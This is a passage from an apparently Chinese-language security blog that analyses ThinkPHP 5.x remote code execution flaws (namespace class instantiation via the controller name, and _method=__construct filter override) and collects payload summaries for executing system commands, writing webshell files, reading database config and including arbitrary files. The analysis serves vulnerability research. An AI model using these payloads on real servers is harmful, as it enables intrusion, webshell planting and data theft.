/></p><p>最终返回数组</p><p><img src="../../../typora-user-images/image-20240723182451423.png" alt="image-20240723182451423" /></p><ol start="6"><li>回到上面的loader的静态方法controller中，获取返回值后，会调用invokeClass方法，这个看起来就是实例化类的方法， 跟入</li></ol><p><img src="../../../typora-user-images/image-20240723182537533.png" alt="image-20240723182537533" /></p><p>果然是反射实例化类</p><p><img src="../../../typora-user-images/image-20240723182700386.png" alt="image-20240723182700386" /></p><ol start="7"><li>实例化后，发现还会获取当前的action参数，并调用实例化类的对应方法</li></ol><p>这里的action与上面的controller获取方式类似</p><p><img src="../../../typora-user-images/image-20240723182955473.png" alt="image-20240723182955473" /></p><p><img src="../../../typora-user-images/image-20240723182833361.png" alt="image-20240723182833361" /></p><p>整个功能就跟完了，我们发现最后是实例化命名空间类，并调用了对应的方法，盲猜一下这是一个可以实例化任意方法的漏洞， 我们跟一下传入的参数是不是可控，返回命名空间和方法的参数是否可以调用到我们想实现的方法。</p><p>传入的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>e</mi><mi>s</mi><mi>u</mi><mi>l</mi><mi>t</mi><mi mathvariant="normal">参</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">为</mi><mi mathvariant="normal">模</mi><mi mathvariant="normal">块</mi><mi mathvariant="normal">/</mi><mi mathvariant="normal">控</mi><mi mathvariant="normal">制</mi><mi mathvariant="normal">器</mi><mi mathvariant="normal">/</mi><mi mathvariant="normal">操</mi><mi mathvariant="normal">作</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">传</mi><mi mathvariant="normal">入</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">控</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">由</mi><mi mathvariant="normal">上</mi><mi mathvariant="normal">图</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">知</mi><mi mathvariant="normal">，</mi></mrow><annotation encoding="application/x-tex">result参数为模块/控制器/操作，传入值可控。由上图可知，</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">t</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">模</span><span class="mord cjk_fallback">块</span><span class="mord">/</span><span class="mord cjk_fallback">控</span><span class="mord cjk_fallback">制</span><span class="mord cjk_fallback">器</span><span class="mord">/</span><span class="mord cjk_fallback">操</span><span class="mord cjk_fallback">作</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">传</span><span class="mord cjk_fallback">入</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">控</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">由</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">图</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">知</span><span class="mord cjk_fallback">，</span></span></span></span>action为传入<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>e</mi><mi>s</mi><mi>u</mi><mi>l</mi><mi>t</mi><mi mathvariant="normal">切</mi><mi mathvariant="normal">割</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">组</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">第</mi><mi mathvariant="normal">三</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">元</mi><mi mathvariant="normal">素</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">类</mi><mi mathvariant="normal">名</mi><mi mathvariant="normal">为</mi></mrow><annotation encoding="application/x-tex">result切割数组的第三个元素，类名为</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">t</span><span class="mord cjk_fallback">切</span><span class="mord cjk_fallback">割</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">第</span><span class="mord cjk_fallback">三</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">素</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">类</span><span class="mord cjk_fallback">名</span><span class="mord cjk_fallback">为</span></span></span></span>instance参数，跟一下这个值的产生即可，</p><p><img src="../../../typora-user-images/image-20240724174443495.png" alt="image-20240724174443495" /></p><p><strong>利用流程：</strong></p><ol><li>看回分析流程的第2步，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>o</mi><mi>n</mi><mi>t</mi><mi>r</mi><mi>o</mi><mi>l</mi><mi>l</mi><mi>e</mi><mi>r</mi><mi mathvariant="normal">变</mi><mi mathvariant="normal">量</mi><mi mathvariant="normal">是</mi></mrow><annotation encoding="application/x-tex">controller变量是</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord cjk_fallback">变</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">是</span></span></span></span>result切割数组的第二个元素，跟入第3步方法，返回值取决于这个$class值</li></ol><p><img src="../../../typora-user-images/image-20240724175721587.png" alt="image-20240724175721587" /></p><ol start="2"><li>重点在getModuleAndClass静态方法，关注返回的$class。</li></ol><p>看回分析流程的第4步，$class的赋值只有两处：</p><ul><li>第一处逻辑是如果name中包含\，直接返回name做class</li><li>第二处的逻辑我们在第5步分析了，返回值是拼接的，且开头的命名空间为App::$namespace，限制较高</li></ul><p>这样来看我们要让传入的name参数包含\，name实际上就是我们最开始获取的$controller方法</p><p><img src="../../../typora-user-images/image-20240724180055811.png" alt="image-20240724180055811" /></p><p>分析后就很简单了</p><p>我们传入的格式是：模块/控制器/操作，控制器这里我们要传入字符包含\，这样最终处理后就能直接初始化我们想要的class。而\在tp有额外的”命名空间的含义“，这样也就达成了可以初始化任意类的目的</p><p>我们先测试传入index/a\b/1</p><p>发现无法解析\，服务端当作了/处理</p><p><img src="../../../typora-user-images/image-20240724181057139.png" alt="image-20240724181057139" /></p><p>但是tp默认支持多种路由方式，可以使用参数的形式传入</p><p><img src="../../../typora-user-images/image-20240724181538375.png" alt="image-20240724181538375" /></p><p>接下来改一下传参方式：<a href="http://tp5022.com/index.php/?s=index/a%5Cb/%E5%8F%91%E7%8E%B0%E6%9E%9C%E7%84%B6%E5%A6%82%E6%88%91%E4%BB%AC%E6%89%80%E6%96%99%EF%BC%8Cclass%E5%90%8D%E7%A7%B0%E6%88%91%E4%BB%AC%E7%8E%B0%E5%9C%A8%E5%8F%AF%E6%8E%A7%E4%BA%86%E3%80%82">http://tp5022.com/index.php/?s=index/a\b/发现果然如我们所料，class名称我们现在可控了。</a></p><p><img src="../../../typora-user-images/image-20240724181836353.png" alt="image-20240724181836353" /></p><p>我们找一下内部存在的类测试一下：/index/think\app/index</p><p>发现类成功进行了初始化，爆错提示方法不存在而已</p><p><img src="../../../typora-user-images/image-20240724182230104.png" alt="image-20240724182230104" /></p><p>这个漏洞到此也就分析成功，内部逻辑缺陷，导致可以用命名空间的方式来调用任意类的任意方法。</p><p><strong>至于为什么ThinkPHP可以使用命名空间直接实例化，可以看这篇文章：</strong></p><p><a href="https://segmentfault.com/a/1190000020172925">https://segmentfault.com/a/1190000020172925</a></p><p>简单总结就是：正常我们需要include，然后才能尝试实例化，而在tp中，实例化是有如下流程的：</p><p><img src="../../../typora-user-images/image-20240725113342175.png" alt="image-20240725113342175" /></p><p>文中也举例了（如下图），实际上TP默认维护了绑定映射关系，think就是一个根命名空间，其对应的初始命名空间目录就是系统的类库目录（thinkphp/library/think）</p><p><img src="../../../typora-user-images/image-20240725113510376.png" alt="image-20240725113510376" /></p><h2 id="3漏洞利用"><a class="markdownIt-Anchor" href="#3漏洞利用"></a> 3.漏洞利用</h2><p>经过上面的分析，依托TP的命名空间和自动类加载的机制，我们已经获取了实例化任意类的入口，接下来就是看一下TP框架本身哪些方法可以被利用了。</p><h3 id="31遇见问题"><a class="markdownIt-Anchor" href="#31遇见问题"></a> 3.1遇见问题</h3><p>我们在tp找到了一个文件写入类，命名空间应该为：<strong>\think\template\driver\File</strong></p><p><img src="../../../typora-user-images/image-20240725140912344.png" alt="image-20240725140912344" /></p><p>使用payload打一下发现提示控制器不存在，观察一下， 发现控制器的file变成了小写，难怪找不到这个File类</p><p><img src="../../../typora-user-images/image-20240725141123558.png" alt="image-20240725141123558" /></p><p>分析了一下相关大小写相关代码</p><ol><li>发现最初获取控制器名就会转换成小写。</li></ol><p>配置里的url_convert还为true，默认就会转成小写。</p><p><img src="../../../typora-user-images/image-20240725141452713.png" alt="image-20240725141452713" /></p><p><img src="../../../typora-user-images/image-20240725141402353.png" alt="image-20240725141402353" /></p><ol start="2"><li>上面提到的tp会根据命名空间自动寻找对应的类，<code>\think\Loader::autoload</code></li></ol><p>其中有一段非Win环境不严格区分大小写，是windows无法走到下面的include，也就没办法包含到文件</p><p><img src="../../../typora-user-images/image-20240725141739998.png" alt="image-20240725141739998" /></p><h3 id="32漏洞利用总结"><a class="markdownIt-Anchor" href="#32漏洞利用总结"></a> 3.2漏洞利用总结</h3><h4 id="tp-50x-version-5022"><a class="markdownIt-Anchor" href="#tp-50x-version-5022"></a> TP 5.0.x &lt;=version&lt;= 5.0.22</h4><p>由上面的问题，简单跟了一下发现在windows环境下自动加载类根本无法加载到想要类文件，所以只能找框架初始化的时候就已经加载的类。</p><p>在Linux一样如此，处理小写的控制器，拼接文件名还是小写，虽然走到了下面的include，但是因为Linux文件名区分大小写，无法包含到。</p><pre class="line-numbers language-none"><code class="language-none">think\Routethink\Configthink\Errorthink\Appthink\Requestthink\Hookthink\Envthink\Langthink\Logthink\Loader<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现可以执行任意方法，且可以执行带参数的方法。</p><p><img src="../../../typora-user-images/image-20240725145500102.png" alt="image-20240725145500102" /></p><p><img src="../../../typora-user-images/image-20240725150328217.png" alt="image-20240725150328217" /></p><p><strong>最终可用payload：</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">s<span class="token operator">=</span><span class="token operator">/</span>index<span class="token operator">/</span>\think\app<span class="token operator">/</span>invokefunction<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>var_dump<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">123123</span> <span class="token comment"># 打印的方式检测漏洞</span><span class="token operator">?</span>s<span class="token operator">=</span><span class="token operator">/</span>index<span class="token operator">/</span>\think\app<span class="token operator">/</span>invokefunction<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>file_put_contents<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>shell1213<span class="token operator">.</span>php<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">123123</span> <span class="token comment"># 文件写入</span><span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>think\config<span class="token operator">/</span>get<span class="token operator">&amp;</span>name<span class="token operator">=</span>database<span class="token operator">.</span>username <span class="token comment"># 获取配置信息</span><span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\Lang<span class="token operator">/</span>load<span class="token operator">&amp;</span>file<span class="token operator">=</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>test<span class="token operator">.</span>jpg    <span class="token comment"># 包含任意文件</span><span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\Config<span class="token operator">/</span>load<span class="token operator">&amp;</span>file<span class="token operator">=</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>t<span class="token operator">.</span>php     <span class="token comment"># 包含任意.php文件</span><span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\app<span class="token operator">/</span>invokefunction<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>id  <span class="token comment">#执行系统命令</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="tp-51x-version-5130"><a class="markdownIt-Anchor" href="#tp-51x-version-5130"></a> TP 5.1.x &lt;=version&lt;= 5.1.30</h4><p>5.1的具体漏洞分析流程就不分析了，大致与5.0相似，虽然相似度不高，但是直接往下跟控制器的赋值就行了</p><p>上面5.0遇到的问题，在5.1存在吗？看一下两处的代码：</p><ul><li>获取控制器部分</li></ul><p>默认对获取的值也是会小写的</p><p><img src="../../../typora-user-images/image-20240725164747021.png" alt="image-20240725164747021" /></p><p><img src="../../../typora-user-images/image-20240725164730640.png" alt="image-20240725164730640" /></p><ul><li>类自动加载部分</li></ul><p>逻辑与5.0相同，写法，但还是无法加载</p><p><img src="../../../typora-user-images/image-20240725164906870.png" alt="image-20240725164906870" /></p><p>只能寻找初始化时已经加载（include）的类</p><pre class="line-numbers language-none"><code class="language-none">think\Loader Composer\Autoload\ComposerStaticInit289837ff5d5ea8a00f5cc97a07c04561think\Error think\Containerthink\App think\Env think\Config think\Hook think\Facadethink\facade\Envenvthink\Dbthink\Lang think\Request think\Log think\log\driver\Filethink\facade\Routeroutethink\Route think\route\Rulethink\route\RuleGroupthink\route\Domainthink\route\RuleItemthink\route\RuleNamethink\route\Dispatchthink\route\dispatch\Urlthink\route\dispatch\Modulethink\Middlewarethink\Cookiethink\Viewthink\view\driver\Thinkthink\Templatethink\template\driver\Filethink\Sessionthink\Debugthink\Cachethink\cache\Driverthink\cache\driver\File<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现**\think\template\driver\File**类在5.1已经在初始化时就已经加载，所以可以使用。</p><p><strong>可用payload：</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">?s=index/\think\Request/input&amp;filter[]=system&amp;data=whomai # callback回调?s=index/\think\view\driver\Think/display&amp;template=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>   #shell生成在runtime/temp/md5(template).php?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> # 写文件?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id # 命令执行?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id # 命令执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4payload汇总"><a class="markdownIt-Anchor" href="#4payload汇总"></a> 4.Payload汇总</h2><h3 id="tp-50"><a class="markdownIt-Anchor" href="#tp-50"></a> TP 5.0</h3><pre class="line-numbers language-none"><code class="language-none">s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;var_dump&amp;vars[0]&#x3D;123123 # 打印的方式检测漏洞?s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;file_put_contents&amp;vars[1][]&#x3D;shell1213.php&amp;vars[1][]&#x3D;123123 # 文件写入?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username # 获取配置信息?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg    # 包含任意文件?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php     # 包含任意.php文件?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id  #执行系统命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="tp-51"><a class="markdownIt-Anchor" href="#tp-51"></a> TP 5.1</h3><pre class="line-numbers language-none"><code class="language-none">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;whomai # callback回调?s&#x3D;index&#x2F;\think\view\driver\Think&#x2F;display&amp;template&#x3D;&lt;?php phpinfo();?&gt;   #shell生成在runtime&#x2F;temp&#x2F;md5(template).php?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt; # 写文件?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id # 命令执行?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id # 命令执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x03-thinkphp-5x命令执行method任意调用方法导致rce"><a class="markdownIt-Anchor" href="#0x03-thinkphp-5x命令执行method任意调用方法导致rce"></a> 0x03 ThinkPHP 5.x命令执行（method任意调用方法导致RCE）</h1><h2 id="1影响版本-2"><a class="markdownIt-Anchor" href="#1影响版本-2"></a> 1.影响版本</h2><p>ThinkPHP v5.0.x &lt;=x&lt;= 5.0.23</p><p>ThinkPHP v5.1.x &lt;=x&lt;= 5.1.32</p><p>看一下patch：</p><p><img src="../../../typora-user-images/image-20240726150103603.png" alt="image-20240726150103603" /></p><p>简单分析了下，发现对POST参数进行了白名单判断，限定了POST获取的var_method参数。</p><h2 id="2漏洞分析-2"><a class="markdownIt-Anchor" href="#2漏洞分析-2"></a> 2.漏洞分析</h2><p>通过上面的分析，很容易想到利用方式：</p><ul><li>method从POST参数获取并转为大写（PHP的函数是不区分大小写的，所以转大写也无所谓了）</li><li>接下来会调用Request类的对应方法，参数为POST参数</li></ul><p>只要找Request类中可以被利用的方法（方法参数只能有1个）就可以了。</p><p>找了一圈发现不存在直接利用的，发现有一个可以覆盖任意属性的__contruct方法</p><p><img src="../../../typora-user-images/image-20240726180501090.png" alt="image-20240726180501090" /></p><p>接下来的思路就是寻找TP框架接收参数或者处理路由的时候是否会调用Request的参数了，这样的话我们就能利用此类赋值恶意属性，达成利用效果了。</p><p>但在开始之前，我们先简单跟一下，如何可以触发最开始的diff的位置</p><p>Request是TP处理请求的类，只要发起请求就会触发到此类，method是处理路由的方法，所以很容易触发diff位置。</p><p><img src="../../../typora-user-images/image-20240727171455416.png" alt="image-20240727171455416" /></p><p><img src="../../../typora-user-images/image-20240727153232409.png" alt="image-20240727153232409" /></p><p>接下来就是寻找可能利用Request中恶意参数的位置了，大致的挖掘思路如下：</p><ul><li>从TP的入口开始跟，发现调用Request的方法就跟进去</li><li>然后再看方法可不可以进行恶意利用（写文件，callback执行等），</li><li>最后看参数是否可控</li></ul><ol><li><p>入口点为APP 的run静态方法</p><p><img src="../../../typora-user-images/image-20240727155146208.png" alt="image-20240727155146208" /></p></li><li><p>跟入param方法，request变量为初始化的Request类对象</p><p><img src="../../../typora-user-images/image-20240727155758652.png" alt="image-20240727155758652" /></p></li><li><p>跟入方法，发现method方法，继续跟入</p></li></ol><p><img src="../../../typora-user-images/image-20240802155452448.png" alt="image-20240802155452448" /></p><ol start="4"><li>参数为true，会调用到server方法</li></ol><p><img src="../../../typora-user-images/image-20240802155537768.png" alt="image-20240802155537768" /></p><ol start="5"><li>调用server方法，跟入其中的input方法</li></ol><p><img src="../../../typora-user-images/image-20240802155613522.png" alt="image-20240802155613522" /></p><ol start="6"><li>看一下其中的filterValue方法</li></ol><p><img src="../../../typora-user-images/image-20240727160127104.png" alt="image-20240727160127104" /></p><ol start="7"><li>发现callback触发点</li></ol><p><img src="../../../typora-user-images/image-20240727160212522.png" alt="image-20240727160212522" /></p><p>利用流程已经整理好了，要完成完整的利用链，还要考虑两点：</p><ul><li><ol><li>整个过程中的if条件都能符合吗？</li></ol></li><li><ol start="2"><li>还有没有其他的调用最初param方法的位置？</li></ol></li></ul><h3 id="21遇见问题需要开启debug的利用链"><a class="markdownIt-Anchor" href="#21遇见问题需要开启debug的利用链"></a> 2.1遇见问题（需要开启debug的利用链）</h3><p>我们看回漏洞分析2步骤的if逻辑，看一下debug的静态属性是什么含义。</p><p>分析了一下该变量就是系统debug配置，类调用run方法时会进行属性的初始化。</p><p>也就是说，我们想触发上面的调用链，第一个if条件就要符合，也就是说<strong>系统需要开启debug模式才行</strong>。</p><p><img src="../../../typora-user-images/image-20240727161239734.png" alt="image-20240727161239734" /></p><p>先调通Payload，在链条中找到可被赋值的Request的属性</p><p><img src="../../../typora-user-images/image-20240727174846709.png" alt="image-20240727174846709" /></p><p><img src="../../../typora-user-images/image-20240727174908476.png" alt="image-20240727174908476" /></p><p>现在可以POST传参对类的filter属性赋值了，$filter也就是callback中调用的函数</p><p><img src="../../../typora-user-images/image-20240802144020516.png" alt="image-20240802144020516" /></p><p>接下来就是callback的函数参数的值了，在这里就是filterValue函数的$data参数了，找一下赋值的地方。</p><p><img src="../../../typora-user-images/image-20240802144908829.png" alt="image-20240802144908829" /></p><p><img src="../../../typora-user-images/image-20240802144825176.png" alt="image-20240802144825176" /></p><p>跟回去赋值$data的地方，发现也是Request类的属性，所以一样可以使用上面的方式</p><p>我们使用server变量赋值，走到filterValue函数上面的if逻辑，发现无法满足这个if，会直接return，无法触发上面的filterValue函数</p><p><img src="../../../typora-user-images/image-20240802153133966.png" alt="image-20240802153133966" /></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$val</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入的参数还要满足如下逻辑，才不会return，这里的data是我们赋值的server变量，解决办法也很简单，我们传入一个输入，满足存在$val键值即可。</p><p>也就是server[REQUEST_METHOD]=12312</p><p>完成利用</p><p><img src="../../../typora-user-images/image-20240802154035302.png" alt="image-20240802154035302" /></p><h3 id="22不开启debug情况下的利用链"><a class="markdownIt-Anchor" href="#22不开启debug情况下的利用链"></a> 2.2不开启Debug情况下的利用链</h3><p>上面也简单提到过，既然没有开启debug，我们就要寻找其他的漏洞触发点</p><ol><li>在App类的方法寻找， 发现其中有调用param方法的位置。</li></ol><p><img src="../../../typora-user-images/image-20240813155235697.png" alt="image-20240813155235697" /></p><ol start="2"><li>反向往回跟，跟invokeMethod方法</li></ol><p><img src="../../../typora-user-images/image-20240813155441971.png" alt="image-20240813155441971" /></p><ol start="3"><li>反向跟module方法</li></ol><p><img src="../../../typora-user-images/image-20240813155810783.png" alt="image-20240813155810783" /></p><ol start="4"><li>找到exec方法</li></ol><p><img src="../../../typora-user-images/image-20240813155907274.png" alt="image-20240813155907274" /></p><ol start="5"><li>最终找到触发点，实际上就在我们上面分析的debug下面的位置</li></ol><p><img src="../../../typora-user-images/image-20240813155948369.png" alt="image-20240813155948369" /></p><ol start="6"><li>找到完整触发链，接下来就是找callback的函数的参数，尽量做到可控</li></ol><p>$filter变量和上面debug那条相同，是获取的this属性，可以使用construct方式对filter属性赋值。</p><p><img src="../../../typora-user-images/image-20240813160850291.png" alt="image-20240813160850291" /></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>a</mi><mi>t</mi><mi>a</mi><mi mathvariant="normal">变</mi><mi mathvariant="normal">量</mi><mi mathvariant="normal">赋</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">在</mi><mi mathvariant="normal">此</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">组</mi><mi mathvariant="normal">合</mi><mi mathvariant="normal">并</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">看</mi><mi mathvariant="normal">中</mi><mi mathvariant="normal">间</mi><mi mathvariant="normal">的</mi></mrow><annotation encoding="application/x-tex">data变量赋值在此，是数组合并的。看中间的</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord cjk_fallback">变</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">赋</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">此</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">合</span><span class="mord cjk_fallback">并</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">看</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">间</span><span class="mord cjk_fallback">的</span></span></span></span>vars，赋值在上面，其实获取的是所有的post参数</p><p><img src="../../../typora-user-images/image-20240813163516793.png" alt="image-20240813163516793" /></p><p>最终callback递归调用filterValue，$data数据键值是我们post的data</p><p><img src="../../../typora-user-images/image-20240813165432649.png" alt="image-20240813165432649" /></p><p>最终也会使用callback调用我们传的参数，完成整条链的调用</p><pre class="line-numbers language-none"><code class="language-none">aaaaa&#x3D;calc&amp;_method&#x3D;__construct&amp;filter[]&#x3D;system<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="../../../typora-user-images/image-20240813165645059.png" alt="image-20240813165645059" /></p><p><strong>我们使用网上的payload做调试的时候，使用calc可能发现弹出来很多个计算器，原因其实也在我们上面的分析过程：</strong></p><p>param是三个参数获取拼接的，我们callback调用是循环调用，filter和参数都是笛卡尔积执行的，最终执行的时候也就执行了calc。</p><p><img src="../../../typora-user-images/image-20240813170430023.png" alt="image-20240813170430023" /></p><h2 id="3-不同版本的payload区别分析"><a class="markdownIt-Anchor" href="#3-不同版本的payload区别分析"></a> 3. 不同版本的Payload区别分析</h2><h4 id="tp-500version507"><a class="markdownIt-Anchor" href="#tp-500version507"></a> TP 5.0.0&lt;=version&lt;=5.0.7</h4><p>我们上面调试的payload是5.0.12版本的，使用的payload是<code>aaaaa=calc&amp;_method=__construct&amp;filter[]=system</code></p><p>在5.0.7使用上面分析的payload，开启debug分析一下，发现会报错。</p><p><img src="../../../typora-user-images/image-20240815105135342.png" alt="image-20240815105135342" /></p><p>对比一下tp5.0.7的代码，发现<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>u</mi><mi>l</mi><mi>e</mi><mi>s</mi><mi mathvariant="normal">这</mi><mi mathvariant="normal">里</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">在</mi><mi mathvariant="normal">高</mi><mi mathvariant="normal">版</mi><mi mathvariant="normal">本</mi><mi mathvariant="normal">做</mi><mi mathvariant="normal">了</mi><mi mathvariant="normal">判</mi><mi mathvariant="normal">断</mi><mi mathvariant="normal">处</mi><mi mathvariant="normal">理</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">低</mi><mi mathvariant="normal">版</mi><mi mathvariant="normal">本</mi><mi mathvariant="normal">没</mi><mi mathvariant="normal">有</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">会</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">组</mi><mi mathvariant="normal">越</mi><mi mathvariant="normal">界</mi><mi mathvariant="normal">，</mi><mi 